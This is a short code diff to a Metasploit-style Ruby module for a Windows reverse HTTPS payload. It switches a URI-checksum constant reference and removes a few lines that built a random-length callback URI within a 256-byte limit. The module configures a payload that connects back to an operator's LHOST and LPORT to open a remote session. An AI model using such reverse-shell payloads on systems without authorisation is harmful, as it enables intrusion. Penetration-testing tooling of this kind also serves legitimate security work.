@@ -42,13 +42,9 @@ module Payload::Windows::ReverseHttps
       return generate_reverse_https(
         host: datastore['LHOST'],
         port: datastore['LPORT'],
-        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW),
+        url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW),
         ssl:  true)
     end
-
-    # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
-    uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
-    uri = generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
 
     conf = {
       ssl:  true,
